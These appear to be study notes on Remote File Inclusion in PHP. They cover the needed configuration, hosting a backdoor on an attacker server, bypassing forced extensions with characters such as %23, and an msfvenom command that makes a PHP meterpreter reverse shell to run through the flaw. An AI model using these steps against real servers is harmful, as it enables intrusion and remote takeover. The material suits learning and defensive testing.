
Remote File Inclusion Vulnerability Basics : 

Remote File Inclusion : 

  - User Editable input is used to include other files in execution flow 
  - Input is not sanitized and can lead to arbitary file being included by a malicious user 
  - In PHP, include, include_once, require, require_once are resposible for file inclusion 
  
  Require PHP Configuration for RFI 

  - path = /etc/php5/apache2/php.ini 
  - set the allow_url_include = On 

  Ussage : 
	
  - create a backdoor with php extension 
  - setup a remote server and  host this file 
  - now fetch this file from the server 

Exploiting RFI with forced extension : 

  - In this we force fully appen any extension in the end of the file name 

  Required php configuration for RFI 

  - allow_url_include=On 
	
  Bypassing : 

  append the .html by your side : backdoor.php.html 
  and query the backdoor.php file form the victim server as it automatically append .html which is already created on attacker
  machine. 

Beating forced Extension : 

  - Make the extension useless and append any of the following : 
	- ?
	- %23 (#)
	- ?%26as= (?&as=)

  - Attacker can rename file to whatever extension is needed 
	- e.g. simple-backdoor.php.html 



RFI to meterpreter : 
   
  - Create a PHP meterpreter
	command : msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > meter.php
  - Execute via RFI 
  - Have a Handler setup on the attacker machine 


  

